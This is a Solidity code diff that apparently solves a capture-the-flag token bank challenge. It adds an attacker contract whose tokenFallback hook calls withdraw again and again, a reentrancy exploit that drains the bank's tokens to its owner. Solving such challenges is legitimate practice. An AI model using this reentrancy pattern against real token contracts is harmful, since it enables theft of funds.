@@ -46,6 +46,7 @@ contract SimpleERC223Token {
     ) public returns (bool) {
         require(balanceOf[msg.sender] >= value);
 
+
         balanceOf[msg.sender] -= value;
         balanceOf[to] += value;
         emit Transfer(msg.sender, to, value);
@@ -122,5 +123,68 @@ contract TokenBankChallenge {
 
         require(token.transfer(msg.sender, amount));
         balanceOf[msg.sender] -= amount;
+    }
+}
+
+
+contract TokenBankChallengeAttacker {
+    address private owner;
+
+    TokenBankChallenge private target;
+    SimpleERC223Token private token;
+
+    function TokenBankChallengeAttacker(address _target) public {
+        target = TokenBankChallenge(_target);
+        token = target.token();
+        owner = msg.sender;
+    }
+
+    function transfer() external {
+        require(msg.sender == owner);
+        
+        uint256 balance = token.balanceOf(address(this));
+        
+        // send balance to target
+        token.transfer(address(target), balance);
+    }
+
+    function attack() external {
+        require(msg.sender == owner);
+
+        uint256 balance = token.balanceOf(address(this));
+
+        // call withdraw
+        target.withdraw(balance);
+    }
+
+   function tokenFallback(address from, uint256, bytes) external {
+    require(msg.sender == address(token));
+
+    // first transfer from attacker
+    if (from == owner) {
+        return;
+    }
+
+    uint256 balance = token.balanceOf(address(target));
+    uint256 currentBalance = target.balanceOf(address(this));
+
+    if (balance > 0 && currentBalance > 0) {
+        uint256 amountToWithdraw = currentBalance > balance ? balance : currentBalance;
+        target.withdraw(amountToWithdraw);
+
+        // Check if there's still balance in the target contract and withdraw if needed
+        balance = token.balanceOf(address(target));
+        if (balance > 0) {
+            target.withdraw(balance);
+        }
+    }
+}
+
+//withdraw all tokens from the target contract
+
+    function withdraw() external {
+        require(msg.sender == owner);
+        uint256 balance = token.balanceOf(address(this));
+        token.transfer(owner, balance);
     }
 }
